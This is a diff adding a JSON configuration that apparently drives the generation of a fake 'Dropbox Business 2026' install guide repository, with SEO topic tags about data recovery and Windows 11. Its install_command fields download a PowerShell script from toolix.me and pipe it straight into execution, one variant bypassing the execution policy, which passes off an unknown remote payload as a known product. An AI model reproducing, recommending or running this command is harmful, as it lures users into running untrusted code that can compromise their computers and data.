@@ -1,0 +1,29 @@
+{
+  "repo": "Dropbox-Business-2026",
+  "product": "Dropbox Business 2026",
+  "product_title": "Dropbox Business",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "recovery",
+  "topics": [
+    "how-to-install-dropbox-business",
+    "dropbox-business-app",
+    "data-recovery",
+    "file-restore",
+    "partition-recovery",
+    "deleted-files",
+    "storage-scan",
+    "dropbox-business-desktop-tool",
+    "dropbox-business-windows-tool",
+    "dropbox-business",
+    "dropbox-business-desktop-2026",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
